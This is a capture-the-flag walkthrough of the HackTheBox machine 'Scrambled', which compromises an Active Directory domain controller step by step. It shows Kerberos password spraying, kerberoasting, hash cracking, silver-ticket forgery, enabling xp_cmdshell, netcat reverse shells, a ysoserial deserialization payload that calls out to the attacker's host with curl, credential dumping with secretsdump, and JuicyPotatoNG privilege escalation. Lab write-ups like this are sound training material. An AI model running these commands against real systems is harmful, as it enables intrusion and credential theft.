# HackTheBox - Scrambled

## NMAP

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP:
|     version                         
|_    bind                                   
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-11 20:31:53Z)   
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA
|_ssl-date: 2022-06-11T20:35:26+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local 
| Issuer: commonName=scrm-DC1-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
1433/tcp  open  ms-sql-s      Microsoft SQL Server                                         
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-06-11T20:31:09
| Not valid after:  2052-06-11T20:31:09
| MD5:   aa54 162f 4724 50c6 9c3d 396f 9fcd 1baa
|_SHA-1: 7925 3b1a 758b 687d 02f9 137e 0199 9eca 21bf 9264
|_ssl-date: 2022-06-11T20:35:19+00:00; 0s from scanner time.
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, R
PCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  unknown
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  unknown
49693/tcp open  unknown

```

## PORT 139/455 (SMB)

Checking for null authentication on smb 

<img src="https://i.imgur.com/BARqHeu.png"/>

## PORT 80 (HTTP)

<img src="https://i.imgur.com/962nhZi.png"/>

On the support page we'll see a message about NTLM authentication being disabled on the network means that we can't login with just username and password

<Img src="https://i.imgur.com/la8T7Vm.png"/>

There's a page about new user account creation but it wasn't making any request 

<img src="https://i.imgur.com/XFrlOhI.png"/>

Another page about contacting to supports reveals a username  `ksimpson`

<img src="https://i.imgur.com/AhBDdOd.png"/>

Also there's a page about the sales app troubleshooting

<img src="https://i.imgur.com/ApdcpXi.png"/>

<img src="https://i.imgur.com/hZWdgFQ.png"/>

This tells that Sales Order application is running on port 4411 

<img src="https://i.imgur.com/5iztVXE.png"/>

Password reset page tells about password being resetted to same as username so let's try to see if the username we have as a password as ksimpson

```bash
/opt/kerbrute/kerbrute_linux_amd64 passwordspray users.txt ksimpsond -d scrm.local --dc 10.129.72.45 --user-as-pass

```

<img src="https://i.imgur.com/bUVCDKG.png"/>

Since NTLM authentication is disabled we need to do kerberos authentication, we'll need a kerberos ticket for ksimpson for that we can use impacket's `getTGT.py`

```bash
python3 getTGT.py scrm.local/ksimpson
```

<img src="https://i.imgur.com/9qnGBcD.png"/>

Now create a variable `KRB5CCNAME` which hold the this ticket

<img src="https://i.imgur.com/ySS5yVN.png'"/>

Having the ticket we can try to authenticate on smb  with `smbclien`

<img src="https://i.imgur.com/FupU5oI.png"/>

It didn't work but there's an impacket script called `smbclient.py` which we can try to use

<img src="https://i.imgur.com/pAkuawM.png"/>

And this worked, we can list the available shares wiith `shares`

<img src="https://i.imgur.com/Mm7kHcL.png"/>

These shares can be accsssed with `use share_name` but we were only able to access `Public` share

<img src="https://i.imgur.com/MiUJLvd.png"/>

This share only has a pdf file 

<img src="https://i.imgur.com/PzYF2Up.png"/>

It talks about the disabling NTLM authentication as we saw from the alert on the site but it also talks about a SQL so maybe there's a service account we can kerberoast

<img src="https://i.imgur.com/NqmHOU7.png"/>

On performing kerberoasting with  `GetUserSPNs.py`

<img src="https://i.imgur.com/hAkg6AL.png"/>

But it seems like it isn't working properly, there was an issue with GetUsersSPNs.py when it's used with 
kerberos authentication 

https://github.com/SecureAuthCorp/impacket/issues/1206#issuecomment-961395218

<img src="https://i.imgur.com/ysZUS8A.png"/>

We can fix this by following the changes mentioned by the machine author himself

For editing the script we need to know the location of this script for that we can use `-debug` arguement which display where impacket library is installed

<img src="https://i.imgur.com/TiblgcG.png"/>

After making a small change in the script we can get the TGS for `sqlsvc` account

```bash
GetUserSPNs.py -request -dc-ip DC1.scrm.local  scrm.local/ksimpson -k -no-pass -debug      
```

<img src="https://i.imgur.com/1osl1o9.png"/>

I didn't had this issue but some people were having the issue openssl in impacket when using GetUserSPNs and the fix for this was to change the TLS contenxt method from v1 to v1_2

<img src="https://i.imgur.com/nTI6Ssx.png"/>

https://github.com/SecureAuthCorp/impacket/issues/856


Running hashcat against this hash we can get it cracked 

```bash
hashcat -a 0 -m 13100 ./sqlsvc_hash.txt /opt/SecLists/Passwords/rockyou.txt --force[
```

<img src="https://i.imgur.com/xRYUNxj.png"/>

<img src="https://i.imgur.com/NWLEG6x.png"/>

We need to grab sqlsvc's TGT as well

<img src="https://i.imgur.com/42C9SGh.png"/>

Checking if we are able to login to mssql

<img src="https://i.imgur.com/sy6UrlT.png"/>>

Since administrator is able to access this service we need to perform a `Silver Ticket` attack 

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket

## Foothold

We have everything for crafting a silver ticket but we don't have the domain sid and we can't use impacket's lookupid.py as it requires only NTLM authentication but we could use `rpcclient` and in order to use rpcclient with kerberos authentication we need to install `kinit` and `krb5-user`

https://michlstechblog.info/blog/linux-kerberos-authentification-against-windows-active-directory/

After having this installed we need to edit `/etc/krb5.conf` which defines the kerberos relam

<img src="https://i.imgur.com/LiY1QYP.png"/>

```bash
[libdefaults]
        default_realm = SCRM.LOCAL

[realms]
        SCRM.LOCAL = {
                kdc = 10.129.73.76
        }
```

Using `klist` we can check if we have the ticket in the variable

<img src="https://i.imgur.com/j5rfxB2.png"/>

And now we can use rpcclient with kerberos authentication

```bash
rpcclient -U 'scrm.local/ksimpson' dc1.scrm.local -k
```

<img src="https://i.imgur.com/QlxVYu0.png"/>

We can get the domain sid as well by using the command `lookupsid any_user_name` which well return the sid of the user but ignoring the last 4 digits which identifies the user's sid we can get the domain sid which is `S-1-5-21-2743207045-1827831105-2542523200`

Now that we have all the pieces, we need to use `ticketer.py` from impacket to make our silver ticket but before going into making a ticket we need the NTLM hash for sqlsvc's password so we can just use python to generate us the NTLM hash

```python
import hashlib,binascii
hash = hashlib.new('md4', "Pegasus60".encode('utf-16le')).digest();
print (binascii.hexlify(hash));
```

<img src="https://i.imgur.com/prpLOWe.png"/>

```bash
ticketer.py -nthash b999a16500b87d17ec7f2e2a68778f05 -spn MSSQLSvc/dc1.scrm.local -domain scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 administrator

```

<img src="https://i.imgur.com/gXWYdXF.png"/>

We can now login to mssql using mssqlclient, but `xp_cmdshell` was disabled as this will allow us to run system commands 

<img src="https://i.imgur.com/E4w01Uz.png"/>

We can enable this by running `enable_xp_cmdshell` 

<img src="https://i.imgur.com/Q98Zh3Q.png"/>

<img src="https://i.imgur.com/j3iVylF.png"/>

We'll need a reverse shell, we can get it by uploading nc.exe 

<img src="https://i.imgur.com/MvWlLCC.png"/>

<img src="https://i.imgur.com/Yhz81U7.png"/>

After getting a shell as `sqlsvc` I uploaded `ssharphound.exe` to enumerate AD

<img src="https://i.imgur.com/XVX0Qri.png"/>

Using netcat we can transfer this archive on to our system

<img src="https://i.imgur.com/weuQN0M.png"/>

Uploading the json files from archive to bloodhound

<img src="https://i.imgur.com/HomINYd.png"/>

Running shortest path to high targets query didn't showed anything interesting path

<img src="https://i.imgur.com/aMu2jLw.png"/>

## Privilege Escalation (miscsvc)

Having a look back at the pdf we found it talks about the credentials being retrieved

<img src="https://i.imgur.com/ad4ZcZB.png"/>

So going back to mssqclient we can execute quries, let's run a query for getting the database names

```sql
SELECT name FROM master.dbo.sysdatabases;
```

<img src="https://i.imgur.com/yAn1H2N.png"/>

Switching to `ScrambleHR` database, we can now list the tables


```sql
SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE';
```

<img src="https://i.imgur.com/Tn0QvhX.png"/>

From `UserImport` table we can get credentials for `MiscSvc`

<img src="https://i.imgur.com/t968NjH.png"/>

Having the credentials, since NTLM authentication is disabled we can't use winrm to login, so we'll just have to use powershell `Invoke-Command`

```powershell

$SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)
 
 Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { whoami }
```

<img src="https://i.imgur.com/mC2P6iF.png"/>

Transferring nc in miscsvc's directory we can get a reverse shell as this user

<img src="https://i.imgur.com/TdyODg0.png"/>

## Privilege Escalation (NT / Authority )
We are in IT group so we can now access the IT folder from the share and there's ScrambleClient exe and dll

<img src="https://i.imgur.com/k2nhABY.png"/>

Transferring the dll with nc on windows machine we can reverse this by using `ILSpy`

<img src="https://i.imgur.com/PqsvQh7.png"/>

On loading the dll we can see the variables having the available commands like `LOGON` , `LIST_ORDERS` , `UPLOAD_ORDERS` and `QUIT` we can also see the `ServerPort` variable which as a value of 4411 that's listening on port 4411

<img src="https://i.imgur.com/bZBgV4C.png"/>

On using the command LIST_ORDERS, it retuns us some kind of base64 text 

Goging back to ILspy, it's actually serializing the data 

<img src="https://i.imgur.com/WzUmXIR.png"/>

<img src="https://i.imgur.com/FUhkkPk.png"/>

<img src="https://i.imgur.com/gwkqnFF.png"/>

We can exploit this by creating a seriialized payload using `ysoserial` using the proper format and gadget for executing commands

https://github.com/pwntester/ysoserial.net

Even tho we can use ysoserial on linux with `wine` but I just used it windows as it's an exe


<img src="https://i.imgur.com/gCqtngT.png"/>

From the help menu, we can look for gadgets which supports `NetDataContractSerializer` which is a serialization used in .NET applications

So first let's generate a serialized payload which will make a request to our server just to test if the exploit works

```powershell
.\ysoserial.exe -f BinaryFormatter -g SessionSecurityToken -o base64 -c "cmd.exe /c curl http://10.10.14.26:2222/"
```

<img src="https://i.imgur.com/mlTJ7RS.png"/>

<img src="https://i.imgur.com/XFixT2i.png"/>

This got a hit on our python server, which means we can run execute commands, so we'll transfer nc and execute it to get a reverse shell

<img src="https://i.imgur.com/HXXtcfp.png"/>

<img src="https://i.imgur.com/MjmaXOK.png"/>

And we got a shell as `NT / AUTHORITY`, we can now just change the administrator's password to get the TGT and can use either psexec, wmiexec or smbexec to get a shell, we can even use secretsdump.py to get NTDS.dit

<img src="https://i.imgur.com/GO7H0wb.png"/>

<img src="https://i.imgur.com/FZJ96Zm.png"/>

<img src="https://i.imgur.com/39pma2h.png"/>

## psexec

```
psexec.py scrm.local/administrator@dc1.scrm.local -k -no-pass
```

<img src="https://i.imgur.com/s7vMCXH.png"/>

## wmiexec

```bash
wmiexec.py scrm.local/administrator@dc1.scrm.local -k -no-pass
```

<img src="https://i.imgur.com/YzR9Dgu.png"/>

## smbexec

```bash
smbexec.py scrm.local/administrator@dc1.scrm.local -k -no-pass
```

<img src="https://i.imgur.com/hVZSChy.png"/>

## secretsdump

Get those hashes

```bash
secretsdump.py scrm.local/administrator@dc1.scrm.local -k -no-pass 
```

<img src="https://i.imgur.com/j27QulW.png"/>

<img src="https://i.imgur.com/TAMTgc3.png"/>

## Un-Intended 

The un-intended way for this box was exploting `SeImpersonatePrivilege` which `sqlsvc` user had, the box was blooded by exploiting that privilege through the exploits Juicy and Rouge potato but it was soon patched as port 445 was closed or wasn't responding when trying this exploit. Sometime later Opcode shared a tweet related to a new technique being implemented in JuicyPotato

![](https://i.imgur.com/YcDmyB4.png)

We can just download the exe from github 

https://github.com/antonioCoco/JuicyPotatoNG

To verify that we have the impersonate privilege

![](https://i.imgur.com/t1IOU9h.png)

Now running the exploit

```
JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami > C:\Users\sqlsvc\file.txt"
```
![](https://i.imgur.com/CxE5mxC.png)

Reading the file in which we saved the output of `whomai` 

![](https://i.imgur.com/Ns0dipU.png)

We can get the shell just by running nc again 

![](https://i.imgur.com/ctamevs.png)

## References

- https://github.com/SecureAuthCorp/impacket/issues/1206#issuecomment-961395218
- https://www.vgemba.net/microsoft/Kerberos-Linux-Windows-AD/
- https://michlstechblog.info/blog/linux-kerberos-authentification-against-windows-active-directory/
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket
- https://www.trustedsec.com/blog/generate-an-ntlm-hash-in-3-lines-of-python/
- https://github.com/pwntester/ysoserial.net
- https://github.com/antonioCoco/JuicyPotatoNG
- https://twitter.com/splinter_code/status/1572636045086429190?t=75YAkjzDq3TBw2HLBRYUJw&s=33
